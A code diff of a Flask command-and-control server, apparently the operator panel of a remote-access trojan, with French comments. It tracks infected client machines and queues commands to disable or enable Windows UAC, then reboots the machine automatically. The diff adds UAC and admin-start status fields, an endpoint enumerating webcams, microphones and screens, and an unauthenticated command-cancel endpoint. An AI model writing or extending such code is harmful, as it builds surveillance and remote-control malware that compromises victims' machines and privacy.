@@ -22,17 +22,13 @@ except ImportError:
 
 app = Flask(__name__)
 
-# Configuration sécurisée
 def load_secure_config():
-    """Charge la configuration de manière sécurisée"""
     config = {}
     
-    # Chargement depuis les variables d'environnement
     config['SECRET_KEY'] = os.environ.get('SECRET_KEY')
     config['ADMIN_USERNAME'] = os.environ.get('ADMIN_USERNAME')
     config['ADMIN_PASSWORD'] = os.environ.get('ADMIN_PASSWORD')
     
-    # Si pas dans l'environnement, essayer le fichier .env
     if not all([config['SECRET_KEY'], config['ADMIN_USERNAME'], config['ADMIN_PASSWORD']]):
         env_file = os.path.join(os.path.dirname(__file__), '.env')
         if os.path.exists(env_file):
@@ -46,7 +42,6 @@ def load_secure_config():
                         if key in ['SECRET_KEY', 'ADMIN_USERNAME', 'ADMIN_PASSWORD']:
                             config[key] = value
     
-    # Validation de la configuration
     if not config['SECRET_KEY'] or len(config['SECRET_KEY']) < 32:
         print("[ERREUR CRITIQUE] SECRET_KEY manquante ou trop courte (minimum 32 caractères)")
         print("Veuillez configurer SECRET_KEY dans le fichier .env ou les variables d'environnement")
@@ -62,14 +57,12 @@ def load_secure_config():
     
     return config
 
-# Chargement de la configuration sécurisée
 CONFIG = load_secure_config()
 app.secret_key = CONFIG['SECRET_KEY']
 
-# Protection contre les attaques par force brute
 failed_attempts = {}
 RATE_LIMIT_ATTEMPTS = 5
-RATE_LIMIT_WINDOW = 300  # 5 minutes
+RATE_LIMIT_WINDOW = 300
 
 DATABASE = 'c2_clients.db'
 
@@ -90,9 +83,10 @@ def init_db():
         ram_available INTEGER,
         status TEXT DEFAULT 'active',
         client_version TEXT DEFAULT 'unknown',
-        last_update TIMESTAMP
+        last_update TIMESTAMP,
+        uac_status TEXT DEFAULT 'Unknown',
+        admin_start TEXT DEFAULT 'OFF'
     )''')
-    # Ajout des colonnes si la table existe déjà
     try:
         c.execute("ALTER TABLE clients ADD COLUMN client_version TEXT DEFAULT 'unknown'")
     except sqlite3.OperationalError:
@@ -135,11 +129,9 @@ def init_db():
         last_login TIMESTAMP
     )''')
     
-    # Mise à jour de l'admin avec les credentials du .env
     admin_username = CONFIG['ADMIN_USERNAME']
     admin_password = CONFIG['ADMIN_PASSWORD']
     
-    # Hash sécurisé avec salt
     salt = secrets.token_hex(32)
     password_hash = hashlib.pbkdf2_hmac('sha256', admin_password.encode(), salt.encode(), 100000)
     final_hash = salt + ':' + password_hash.hex()
@@ -289,7 +281,6 @@ def command_result():
                  (datetime.datetime.now(), json.dumps(result), command_id))
     conn.commit()
 
-    # Planifier automatiquement un redémarrage si la commande UAC (désactivation ou activation) a réussi
     if command_type in ('disable_uac', 'enable_uac') and result and isinstance(result, dict) and result.get('success'):
         conn.execute('''INSERT INTO commands (machine_id, command_type, params, created_at, status)
                         VALUES (?, ?, ?, ?, "pending")''',
@@ -473,10 +464,91 @@ def set_security_headers(response):
     response.headers['X-Frame-Options'] = 'DENY'
     response.headers['X-XSS-Protection'] = '1; mode=block'
     response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
-    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com;"
+    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com; img-src 'self' data: https://cdn.discordapp.com https://*.discordapp.com;"
     response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
     response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
     return response
+
+@app.route('/api/detect_devices')
+@api_auth_required
+def detect_devices():
+    """Détecte les écrans, webcams et sources audio"""
+    import subprocess
+    import platform
+    import sys
+    
+    result = {'monitors': [], 'webcams': [], 'audio_inputs': [], 'audio_outputs': []}
+    
+    if platform.system() == 'Windows':
+        # Détection écrans via mss (plus léger)
+        try:
+            import mss
+            with mss.mss() as sct:
+                for i, mon in enumerate(sct.monitors[1:]):  # Ignorer le premier (virtuel)
+                    result['monitors'].append({
+                        'index': i,
+                        'width': mon['width'],
+                        'height': mon['height'],
+                        'left': mon.get('left', 0),
+                        'top': mon.get('top', 0)
+                    })
+        except:
+            result['monitors'].append({'index': 0, 'width': 1920, 'height': 1080, 'left': 0, 'top': 0})
+        
+        # Détection webcams - timeout rapide
+        try:
+            import cv2
+            for i in range(5):  # Limiter à 5 webcams pour rapidité
+                cap = cv2.VideoCapture(i)
+                if cap.isOpened():
+                    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
+                    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
+                    result['webcams'].append({
+                        'index': i,
+                        'name': f'Webcam {i+1}',
+                        'resolution': f'{width}x{height}'
+                    })
+                    cap.release()
+        except:
+            pass
+        
+        # Détection audio
+        try:
+            import pyaudio
+            p = pyaudio.PyAudio()
+            for i in range(p.get_device_count()):
+                dev = p.get_device_info_by_index(i)
+                if dev['maxInputChannels'] > 0:
+                    result['audio_inputs'].append({
+                        'index': i,
+                        'name': dev['name'],
+                        'channels': dev['maxInputChannels']
+                    })
+                if dev['maxOutputChannels'] > 0:
+                    result['audio_outputs'].append({
+                        'index': i,
+                        'name': dev['name'],
+                        'channels': dev['maxOutputChannels']
+                    })
+            p.terminate()
+        except:
+            pass
+    
+    return jsonify(result)
+
+@app.route('/api/cancel_command', methods=['POST'])
+def cancel_command():
+    data = request.get_json()
+    if not data or 'command_id' not in data:
+        return jsonify({'error': 'missing command_id'}), 400
+    
+    command_id = data['command_id']
+    conn = get_db()
+    conn.execute('UPDATE commands SET status = "cancelled" WHERE id = ? AND status = "pending"', (command_id,))
+    conn.commit()
+    conn.close()
+    log_activity('cancel_command', None, f"Command {command_id} cancelled")
+    return jsonify({'status': 'ok'})
 
 @app.before_request
 def security_checks():
